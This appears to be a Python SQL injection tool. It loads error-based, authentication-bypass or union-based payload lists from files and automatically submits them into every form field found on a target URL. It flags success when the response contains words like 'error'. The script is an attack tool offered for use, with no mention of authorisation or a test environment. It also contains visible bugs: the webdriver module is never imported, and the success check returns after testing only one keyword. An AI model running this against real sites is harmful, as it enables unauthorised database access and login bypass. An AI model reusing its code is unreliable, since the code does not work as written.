import requests
import argparse
from bs4 import BeautifulSoup

# get argument
ps = argparse.ArgumentParser()
ps.add_argument("-u", "--url",dest='url', help='specify the target site')
ps.add_argument("-p", "--payload",dest='pn', help='specify the payload --1 for error based --2 for auth bypass --3 for union based')
option = ps.parse_args()
url = option.url
PN = option.pn

# set header user-agent
s = requests.Session()
s.headers['User-Agent'] = 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0'''

# set payload
def set_payload(pn):
    if pn == '1':
        print(f'Payload set to error based')
        payload = []
        with open("errorpayload.txt", 'r') as f:
            payload = (f.read().splitlines())
        return payload
    elif pn == '2':
        print(f'Payload set to auth bypass')
        payload = []
        with open("authbypass.txt", 'r') as f:
            payload = (f.read().splitlines())
        return payload
    elif pn == '3':
        print(f'Payload set to union based')
        payload = []
        with open("union.txt", 'r') as f:
            payload = (f.read().splitlines())
        return payload
    # elif pn == '4':
    #     print(f'Payload set to blind time based')
    #     payload = []
    #     with open("timeblind.txt", 'r') as f:
    #         payload = (f.read().splitlines())
    #     return payload
    else:
        print(f'This payload number does not exit')

# attract form from url
def get_form(url):
    opt = webdriver.ChromeOptions()
    driver = webdriver.Chrome(options=opt)
    res = driver.get(url)
    s = driver.page_source
    soup = BeautifulSoup(s, "lxml")
    soupl = BeautifulSoup(s, "html.parser")
    form = soup.find(class_='write')
    forml = soupl.find_all("form")
    if len(forml) <= 1 :
        return form
    else :
        return forml


# get form details
def form_detail(form):
    formdt = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get")
    inputs = []

    for inputs_tag in form.find_all("input"):
        inputs_type = inputs_tag.attrs.get('type', 'text')
        inputs_name = inputs_tag.attrs.get('name')
        inputs_value = inputs_tag.attrs.get('value', '')
        inputs.append({"type":inputs_type, "name":inputs_name, "value":inputs_value})

    formdt['action'] = action
    formdt['method'] = method
    formdt['inputs'] = inputs
    return formdt

# check response
def vuln(response):
      success_resp = {"success", "systax", "error"}
      for resp in success_resp:
          if resp in response.content.decode().lower():
              print(resp)
              return True
          else:
              return False

# form scanner
def injector(url, payload):
     forms = get_form(url)
     print(f"founded {len(forms)} input on {url}")

     for form in forms:
        details = form_detail(form)

        for i in payload:
            data = {}
            for input_tag in details["inputs"]:
                if input_tag['type'] == "hidden" or input_tag["value"]:
                    data[input_tag['name']]=input_tag["value"]+i
                elif input_tag["type"] != "submit":
                    data[input_tag["name"]] = f"test{i}"

            form_detail(form)

            if details["method"] == "post":
                res = s.post(url, data=data)
                print(res)
            elif details["method"] == "get":
                res = s.get(url, params=data)
                print(res)

            if vuln(res):
                print(f"[{i}] works")
                break
            else:
                print(f"Trying {i}")

payload = set_payload(option.pn)

if __name__ == "__main__":
    injector(url, payload)
